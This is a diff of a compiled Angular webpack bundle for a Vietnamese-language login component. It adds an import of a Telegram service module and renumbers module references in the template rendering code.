@@ -267,21 +267,23 @@ __webpack_require__.r(__webpack_exports__);
 /* harmony export */ __webpack_require__.d(__webpack_exports__, {
 /* harmony export */   LoginComponent: () => (/* binding */ LoginComponent)
 /* harmony export */ });
-/* harmony import */ var _angular_forms__WEBPACK_IMPORTED_MODULE_9__ = __webpack_require__(/*! @angular/forms */ 89417);
+/* harmony import */ var _angular_forms__WEBPACK_IMPORTED_MODULE_10__ = __webpack_require__(/*! @angular/forms */ 89417);
 /* harmony import */ var _environments_environment__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./../../environments/environment */ 45312);
 /* harmony import */ var _share_animate__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ../share/animate */ 27121);
-/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_8__ = __webpack_require__(/*! @angular/core */ 17705);
+/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_9__ = __webpack_require__(/*! @angular/core */ 17705);
 /* harmony import */ var _share_services_plus_service__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ../share/services/plus.service */ 22014);
 /* harmony import */ var _share_services_authV2_service__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ../share/services/authV2.service */ 50532);
 /* harmony import */ var _share_services_form_service__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ../share/services/form.service */ 60064);
-/* harmony import */ var _angular_common__WEBPACK_IMPORTED_MODULE_10__ = __webpack_require__(/*! @angular/common */ 60177);
-/* harmony import */ var _angular_router__WEBPACK_IMPORTED_MODULE_11__ = __webpack_require__(/*! @angular/router */ 7901);
-/* harmony import */ var _angular_material_button__WEBPACK_IMPORTED_MODULE_12__ = __webpack_require__(/*! @angular/material/button */ 88834);
-/* harmony import */ var _angular_material_icon__WEBPACK_IMPORTED_MODULE_13__ = __webpack_require__(/*! @angular/material/icon */ 99213);
-/* harmony import */ var _angular_material_tooltip__WEBPACK_IMPORTED_MODULE_14__ = __webpack_require__(/*! @angular/material/tooltip */ 14823);
-/* harmony import */ var _share_account_login_google_login_google_component__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! ../share/account/login-google/login-google.component */ 27756);
-/* harmony import */ var _site_footer_footer_component__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__(/*! ../site/footer/footer.component */ 52106);
-/* harmony import */ var _zalo_zalo_component__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__(/*! ./zalo/zalo.component */ 35556);
+/* harmony import */ var _share_services_telegram_service__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! ../share/services/telegram.service */ 21421);
+/* harmony import */ var _angular_common__WEBPACK_IMPORTED_MODULE_11__ = __webpack_require__(/*! @angular/common */ 60177);
+/* harmony import */ var _angular_router__WEBPACK_IMPORTED_MODULE_12__ = __webpack_require__(/*! @angular/router */ 7901);
+/* harmony import */ var _angular_material_button__WEBPACK_IMPORTED_MODULE_13__ = __webpack_require__(/*! @angular/material/button */ 88834);
+/* harmony import */ var _angular_material_icon__WEBPACK_IMPORTED_MODULE_14__ = __webpack_require__(/*! @angular/material/icon */ 99213);
+/* harmony import */ var _angular_material_tooltip__WEBPACK_IMPORTED_MODULE_15__ = __webpack_require__(/*! @angular/material/tooltip */ 14823);
+/* harmony import */ var _share_account_login_google_login_google_component__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__(/*! ../share/account/login-google/login-google.component */ 27756);
+/* harmony import */ var _site_footer_footer_component__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__(/*! ../site/footer/footer.component */ 52106);
+/* harmony import */ var _zalo_zalo_component__WEBPACK_IMPORTED_MODULE_8__ = __webpack_require__(/*! ./zalo/zalo.component */ 35556);
+
 
 
 
@@ -301,187 +303,188 @@ __webpack_require__.r(__webpack_exports__);
 
 function LoginComponent_div_3_ng_template_3_Template(rf, ctx) {
   if (rf & 1) {
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementStart"](0, "b", 13);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵtext"](1);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementEnd"]();
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementStart"](0, "b", 13);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵtext"](1);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementEnd"]();
   }
   if (rf & 2) {
-    const item_r6 = _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵnextContext"]().$implicit;
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵpropertyInterpolate"]("matTooltip", item_r6.label);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵadvance"](1);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵtextInterpolate1"](" ", item_r6.label, " ");
+    const item_r6 = _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵnextContext"]().$implicit;
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵpropertyInterpolate"]("matTooltip", item_r6.label);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵadvance"](1);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵtextInterpolate1"](" ", item_r6.label, " ");
   }
 }
 function LoginComponent_div_3_Template(rf, ctx) {
   if (rf & 1) {
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementStart"](0, "div", 9)(1, "span", 10);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelement"](2, "img", 11);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵtemplate"](3, LoginComponent_div_3_ng_template_3_Template, 2, 2, "ng-template", null, 12, _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵtemplateRefExtractor"]);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementEnd"]()();
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementStart"](0, "div", 9)(1, "span", 10);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelement"](2, "img", 11);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵtemplate"](3, LoginComponent_div_3_ng_template_3_Template, 2, 2, "ng-template", null, 12, _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵtemplateRefExtractor"]);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementEnd"]()();
   }
   if (rf & 2) {
     const item_r6 = ctx.$implicit;
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵproperty"]("@slideIn", undefined);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵadvance"](1);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵpropertyInterpolate1"]("routerLink", "/", item_r6.link, "");
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵadvance"](1);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵpropertyInterpolate1"]("src", "/assets/img/", item_r6.api, ".png", _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵsanitizeUrl"]);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵpropertyInterpolate"]("alt", item_r6.label);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵpropertyInterpolate"]("matTooltip", item_r6.label);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵproperty"]("@slideIn", undefined);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵadvance"](1);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵpropertyInterpolate1"]("routerLink", "/", item_r6.link, "");
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵadvance"](1);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵpropertyInterpolate1"]("src", "/assets/img/", item_r6.api, ".png", _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵsanitizeUrl"]);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵpropertyInterpolate"]("alt", item_r6.label);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵpropertyInterpolate"]("matTooltip", item_r6.label);
   }
 }
 function LoginComponent_div_4_span_4_Template(rf, ctx) {
   if (rf & 1) {
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementStart"](0, "span", 27);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelement"](1, "img", 28);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementEnd"]();
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementStart"](0, "span", 27);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelement"](1, "img", 28);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementEnd"]();
   }
   if (rf & 2) {
-    const ctx_r11 = _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵnextContext"](2);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵadvance"](1);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵpropertyInterpolate"]("src", ctx_r11.photoUrl, _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵsanitizeUrl"]);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵpropertyInterpolate"]("matTooltip", ctx_r11.user.fullName);
+    const ctx_r11 = _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵnextContext"](2);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵadvance"](1);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵpropertyInterpolate"]("src", ctx_r11.photoUrl, _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵsanitizeUrl"]);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵpropertyInterpolate"]("matTooltip", ctx_r11.user.fullName);
   }
 }
 function LoginComponent_div_4_li_6_Template(rf, ctx) {
   if (rf & 1) {
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementStart"](0, "li", 21);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵtext"](1, " H\u1ECD v\u00E0 t\u00EAn: ");
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementStart"](2, "b");
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵtext"](3);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵpipe"](4, "titlecase");
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementEnd"]()();
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementStart"](0, "li", 21);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵtext"](1, " H\u1ECD v\u00E0 t\u00EAn: ");
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementStart"](2, "b");
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵtext"](3);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵpipe"](4, "titlecase");
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementEnd"]()();
   }
   if (rf & 2) {
-    const ctx_r12 = _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵnextContext"](2);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵadvance"](3);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵtextInterpolate1"](" ", _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵpipeBind1"](4, 1, ctx_r12.user == null ? null : ctx_r12.user.fullName), "");
+    const ctx_r12 = _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵnextContext"](2);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵadvance"](3);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵtextInterpolate1"](" ", _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵpipeBind1"](4, 1, ctx_r12.user == null ? null : ctx_r12.user.fullName), "");
   }
 }
 function LoginComponent_div_4_li_7_Template(rf, ctx) {
   if (rf & 1) {
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementStart"](0, "li", 21);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵtext"](1, " \u0110\u01A1n v\u1ECB: ");
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementStart"](2, "b");
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵtext"](3);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵpipe"](4, "titlecase");
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵpipe"](5, "titlecase");
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementEnd"]()();
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementStart"](0, "li", 21);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵtext"](1, " \u0110\u01A1n v\u1ECB: ");
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementStart"](2, "b");
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵtext"](3);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵpipe"](4, "titlecase");
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵpipe"](5, "titlecase");
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementEnd"]()();
   }
   if (rf & 2) {
-    const ctx_r13 = _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵnextContext"](2);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵadvance"](3);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵtextInterpolate2"](" ", _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵpipeBind1"](4, 2, ctx_r13.user == null ? null : ctx_r13.user.unit), " ", _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵpipeBind1"](5, 4, ctx_r13.user == null ? null : ctx_r13.user.unitFull), "");
+    const ctx_r13 = _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵnextContext"](2);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵadvance"](3);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵtextInterpolate2"](" ", _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵpipeBind1"](4, 2, ctx_r13.user == null ? null : ctx_r13.user.unit), " ", _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵpipeBind1"](5, 4, ctx_r13.user == null ? null : ctx_r13.user.unitFull), "");
   }
 }
 function LoginComponent_div_4_button_15_Template(rf, ctx) {
   if (rf & 1) {
-    const _r17 = _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵgetCurrentView"]();
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementStart"](0, "button", 29);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵlistener"]("click", function LoginComponent_div_4_button_15_Template_button_click_0_listener() {
-      _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵrestoreView"](_r17);
-      const ctx_r16 = _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵnextContext"](2);
-      return _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵresetView"](ctx_r16.installApp());
+    const _r17 = _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵgetCurrentView"]();
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementStart"](0, "button", 29);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵlistener"]("click", function LoginComponent_div_4_button_15_Template_button_click_0_listener() {
+      _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵrestoreView"](_r17);
+      const ctx_r16 = _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵnextContext"](2);
+      return _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵresetView"](ctx_r16.installApp());
     });
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵtext"](1, " C\u00E0i \u1EE9ng d\u1EE5ng ");
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementStart"](2, "mat-icon", 25);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵtext"](3, "install_mobile");
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementEnd"]()();
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵtext"](1, " C\u00E0i \u1EE9ng d\u1EE5ng ");
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementStart"](2, "mat-icon", 25);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵtext"](3, "install_mobile");
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementEnd"]()();
   }
 }
 function LoginComponent_div_4_span_24_Template(rf, ctx) {
   if (rf & 1) {
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelement"](0, "span");
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelement"](0, "span");
   }
 }
 function LoginComponent_div_4_Template(rf, ctx) {
   if (rf & 1) {
-    const _r19 = _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵgetCurrentView"]();
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementStart"](0, "div", 14)(1, "div", 15)(2, "div", 16)(3, "div", 17);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵtemplate"](4, LoginComponent_div_4_span_4_Template, 2, 2, "span", 18);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementEnd"]();
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementStart"](5, "ul", 19);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵtemplate"](6, LoginComponent_div_4_li_6_Template, 5, 3, "li", 20);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵtemplate"](7, LoginComponent_div_4_li_7_Template, 6, 6, "li", 20);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementStart"](8, "li", 21);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵtext"](9, " S\u1ED1 \u0111i\u1EC7n tho\u1EA1i: ");
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementStart"](10, "b");
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵtext"](11);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementEnd"]()();
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementStart"](12, "li", 21)(13, "i");
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵtext"](14);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementEnd"]();
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵtemplate"](15, LoginComponent_div_4_button_15_Template, 4, 0, "button", 22);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementEnd"]();
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementStart"](16, "li", 21)(17, "i");
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵtext"](18);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementEnd"]()()();
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementStart"](19, "div", 23)(20, "button", 24);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵlistener"]("click", function LoginComponent_div_4_Template_button_click_20_listener() {
-      _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵrestoreView"](_r19);
-      const ctx_r18 = _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵnextContext"]();
-      return _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵresetView"](ctx_r18.signOut());
+    const _r19 = _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵgetCurrentView"]();
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementStart"](0, "div", 14)(1, "div", 15)(2, "div", 16)(3, "div", 17);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵtemplate"](4, LoginComponent_div_4_span_4_Template, 2, 2, "span", 18);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementEnd"]();
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementStart"](5, "ul", 19);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵtemplate"](6, LoginComponent_div_4_li_6_Template, 5, 3, "li", 20);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵtemplate"](7, LoginComponent_div_4_li_7_Template, 6, 6, "li", 20);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementStart"](8, "li", 21);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵtext"](9, " S\u1ED1 \u0111i\u1EC7n tho\u1EA1i: ");
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementStart"](10, "b");
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵtext"](11);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementEnd"]()();
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementStart"](12, "li", 21)(13, "i");
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵtext"](14);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementEnd"]();
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵtemplate"](15, LoginComponent_div_4_button_15_Template, 4, 0, "button", 22);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementEnd"]();
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementStart"](16, "li", 21)(17, "i");
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵtext"](18);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementEnd"]()()();
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementStart"](19, "div", 23)(20, "button", 24);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵlistener"]("click", function LoginComponent_div_4_Template_button_click_20_listener() {
+      _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵrestoreView"](_r19);
+      const ctx_r18 = _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵnextContext"]();
+      return _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵresetView"](ctx_r18.signOut());
     });
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵtext"](21, " Tho\u00E1t ");
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementStart"](22, "mat-icon", 25);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵtext"](23, "power_settings_new");
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementEnd"]()();
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵtemplate"](24, LoginComponent_div_4_span_24_Template, 1, 0, "span", 26);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementEnd"]()()()();
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵtext"](21, " Tho\u00E1t ");
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementStart"](22, "mat-icon", 25);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵtext"](23, "power_settings_new");
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementEnd"]()();
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵtemplate"](24, LoginComponent_div_4_span_24_Template, 1, 0, "span", 26);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementEnd"]()()()();
   }
   if (rf & 2) {
-    const ctx_r1 = _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵnextContext"]();
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵproperty"]("@slideIn", undefined);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵadvance"](4);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵproperty"]("ngIf", ctx_r1.photoUrl);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵadvance"](2);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵproperty"]("ngIf", ctx_r1.user == null ? null : ctx_r1.user.fullName);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵadvance"](1);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵproperty"]("ngIf", ctx_r1.user == null ? null : ctx_r1.user.unitFull);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵadvance"](4);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵtextInterpolate1"](" ", ctx_r1.user == null ? null : ctx_r1.user.phoneNumber, "");
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵadvance"](3);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵtextInterpolate1"](" ", ctx_r1.version, " ");
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵadvance"](1);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵproperty"]("ngIf", ctx_r1.deferredPrompt && !ctx_r1.isIOS && !ctx_r1.isInStandaloneMode);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵadvance"](3);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵtextInterpolate1"]("ID: ", ctx_r1.user._id, " ");
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵadvance"](6);
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵproperty"]("ngIf", ctx_r1.user._id == "jiAqNrmWXBXNGvDXddtrUp0usIh1");
+    const ctx_r1 = _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵnextContext"]();
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵproperty"]("@slideIn", undefined);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵadvance"](4);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵproperty"]("ngIf", ctx_r1.photoUrl);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵadvance"](2);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵproperty"]("ngIf", ctx_r1.user == null ? null : ctx_r1.user.fullName);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵadvance"](1);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵproperty"]("ngIf", ctx_r1.user == null ? null : ctx_r1.user.unitFull);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵadvance"](4);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵtextInterpolate1"](" ", ctx_r1.user == null ? null : ctx_r1.user.phoneNumber, "");
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵadvance"](3);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵtextInterpolate1"](" ", ctx_r1.version, " ");
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵadvance"](1);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵproperty"]("ngIf", ctx_r1.deferredPrompt && !ctx_r1.isIOS && !ctx_r1.isInStandaloneMode);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵadvance"](3);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵtextInterpolate1"]("ID: ", ctx_r1.user._id, " ");
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵadvance"](6);
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵproperty"]("ngIf", ctx_r1.user._id == "jiAqNrmWXBXNGvDXddtrUp0usIh1");
   }
 }
 function LoginComponent_ng_template_5_Template(rf, ctx) {
   if (rf & 1) {
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementStart"](0, "div", 1)(1, "div", 30)(2, "div", 31)(3, "h5", 32)(4, "b");
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵtext"](5, "\u0110\u0102NG NH\u1EACP");
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementEnd"]()();
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelement"](6, "app-login-google")(7, "app-zalo")(8, "hr");
-    _angular_core__WEBPACK_IMPORTED_MODULE_8__["ɵɵelementEnd"]()()();
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementStart"](0, "div", 1)(1, "div", 30)(2, "div", 31)(3, "h5", 32)(4, "b");
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵtext"](5, "\u0110\u0102NG NH\u1EACP");
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelementEnd"]()();
+    _angular_core__WEBPACK_IMPORTED_MODULE_9__["ɵɵelement"](6, "app-login-google")(7, "app-zalo")(8, "hr");
